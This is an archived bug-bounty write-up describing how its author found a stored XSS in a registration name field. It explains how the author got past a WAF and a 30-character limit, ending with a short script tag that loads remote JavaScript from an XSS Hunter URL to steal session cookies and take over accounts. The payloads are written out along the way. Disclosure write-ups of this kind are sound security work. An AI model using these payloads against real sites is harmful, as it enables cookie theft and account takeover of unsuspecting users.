# How I Found My First Stored XSS || WAF & Characters Limitation Bypass

- **Source URL:** https://kariiem.medium.com/how-i-found-my-first-stored-xss-waf-characters-limitation-bypass-cc414c4fadde?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240603063042/https://kariiem.medium.com/how-i-found-my-first-stored-xss-waf-characters-limitation-bypass-cc414c4fadde?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5801 (id 5801)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Found My First Stored XSS || WAF & Characters Limitation Bypass

Hello everyone, and welcome to my first write-up!

In this write-up I’m excited to share a unique Stored XSS discovery that involved bypassing a Web Application Firewall and character limitations.

This write-up delves into the thought process behind crafting the payload, the challenges encountered and the solutions that unlocked the vulnerability.

# How it begins:

While registration in target, I found that when trying to inject payloads in Name field, form refuses to submit data without any error messages.

So I though it’s a front-end protection and tried to submit it with a regular name and intercepted the request with Burp Suite then added special characters.

name= kario’”>\<


As expected, I could bypass it but the problem that I found these characters was encoded with \`HTML-entities\` in /profile endpoint.

kario'"<>


So I decided to leave it because it would be a self-XSS anyway, while discovering the application I found that I can share a list with other users with a big title *\` Shared by kario’”>\<* **\`** without encoding so the main story comes from here.

# The Art of Problem Solving:

*As it is forbidden to change the name, every time I created a new account.*

First I tried to inject the usual payload:

\<script>alert()\</script>


But the first problem that there is a WAF filtering input and refusing to pass request with 403 response, so I tried alternative payload like

\<img/src=x+onerror=alert()>


`<h1> Shared by <img/src=x onerror=alert()></h1>`
successfully triaged the XSS then I moved to next step to test if I could get account take over by retrieving session cookies

\<img/src=x+onerror=alert(“document.cookie”)>


`<h1> Shared by <img/src=x+onerror=alert("docu</h1>`
Here was the next problem that back-end only takes the first 30 characters considering it is the first name, so the maximum impact would be to display the alert only, which makes it a low impact XSS

So let’s craft a new payload that can bypass WAF and is no more than 30 characters long due to first name limitation, first thing I thought of that I can use external script using src attribute in script tag like this:

\<script/src=External\_Script\_URL>\</script>


Due to limitation I won’t be able to write the closing tag “\</script>” but I would take advantage of the original source code that contains a closing tag so the next closing tag after the place that my payload was injected into, would be used to complete my payload.

\<script/src=External\_Script\_URL>


This method will work because after our script tag ”\<script>” it will still be expected closing tag “\</script>” considering everything between them as it’s a nonsense JavaScript code

Things look good, all that’s left now is for us to get Link for external JavaScript code is no more than 17 characters long to make sure my payload is injected properly

I don’t have a domain to host this script so after search I found that XSSHunter would provide you with external script that would triage the XSS and track if someone has been affected with XSS and the link would be like that “[https://js.rip/ra](https://web.archive.org/web/20240603063042/https://js.rip/F)ndomvalue123”, in settings you can reserve a shorter file name, so I reserved this unique file path from one character “[https://js.rip/F](https://web.archive.org/web/20240603063042/https://js.rip/F)” which is short enough to bypass the limit, so the payload would be like that:

\<script/src=[https://js.rip/F](https://web.archive.org/web/20240603063042/https://js.rip/F)>


But things were not that simple because of the return of our old friend WAF with 403 response, with trying I discovered that I won’t be able to write the greater than sign “>” in script tag

But like before we would take advantage of original source code, Meaning that if we didn’t write the greater than sign, it will still be expected “>” to close the tag considering all coming is a part of src attribute value until it finds the next greater than sign “>”

\<script/src=[https://js.rip/F](https://web.archive.org/web/20240603063042/https://js.rip/F)


The problem now that our URL isn’t correct due to the \<h1> tag, to bypass this problem we can use **URL parameters** or **URL fragment** so the final payload would be:

\<script/src=[https://js.rip/F](https://web.archive.org/web/20240603063042/https://js.rip/F)?test=

\<script/src=[https://js.rip/F](https://web.archive.org/web/20240603063042/https://js.rip/F)#


This would keep our URL correct and assign whatever is coming as a value of the parameter with no effect until it finds the next greater than sign“>”.

Same as fragment, and I used the second way to reduce payload length

All done now and the retrieved cookies contains session cookies so I could gain account take over

Finlay thanks to my friends: **0d-s3m00***,* **mo\_gemy** and **Asbawy** for collaboration, and wait for new write-ups

So, there you have it! I hope you found it informative and interesting. If you have any questions, please leave a comment.
